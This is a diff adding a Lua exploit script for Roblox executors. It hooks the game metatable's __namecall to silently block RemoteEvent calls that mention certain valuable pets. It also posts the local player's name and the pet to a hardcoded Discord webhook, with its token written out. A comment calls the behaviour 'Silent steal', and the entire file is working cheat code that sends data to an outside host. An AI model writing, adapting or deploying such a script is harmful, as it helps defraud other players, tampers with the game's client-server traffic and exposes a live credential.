@@ -1,0 +1,67 @@
+-- 🧊 Silent Pet Hit Interceptor + Webhook Logger for PapaDarek
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+-- ✅ Your webhook
+local YOUR_WEBHOOK = "https://discord.com/api/webhooks/1390230662577131642/0pvuCKhXxviR-oTpqihjOR_DIWQ1ze1VM9aKxle_Y9jEqde43QzB86tz7_xObaKzBZ5U"
+
+-- 🐾 Pets to intercept
+local protectedPets = {
+    ["Disco Bee"] = true,
+    ["Raccoon"] = true,
+    ["Dragonfly"] = true,
+    ["Kitsune"] = true,
+}
+
+-- 🔔 Send hit info to your webhook only
+local function sendToWebhook(petName, attackerName)
+    local data = {
+        embeds = {{
+            title = "🔒 Protected Pet Intercepted",
+            color = 16711680,
+            fields = {
+                {name = "🐾 Pet", value = petName, inline = true},
+                {name = "🧑 Attacker", value = attackerName, inline = true},
+            },
+            footer = {text = "🐾 Logged by PapaDarek"}
+        }}
+    }
+
+    local req = http_request or request or (syn and syn.request) or fluxus and fluxus.request
+    if req then
+        pcall(function()
+            req({
+                Url = YOUR_WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
+end
+
+-- 🧠 Intercept RemoteEvent hits silently
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+
+local oldNamecall = mt.__namecall
+
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+
+    if method == "FireServer" and typeof(self) == "Instance" and self:IsA("RemoteEvent") then
+        for _, arg in ipairs(args) do
+            if typeof(arg) == "string" and protectedPets[arg] then
+                -- Silent steal: send only to your webhook
+                local attackerName = Players.LocalPlayer and Players.LocalPlayer.Name or "Unknown"
+                sendToWebhook(arg, attackerName)
+                return nil -- Block the request
+            end
+        end
+    end
+
+    return oldNamecall(self, unpack(args))
+end)
+
+setreadonly(mt, true)
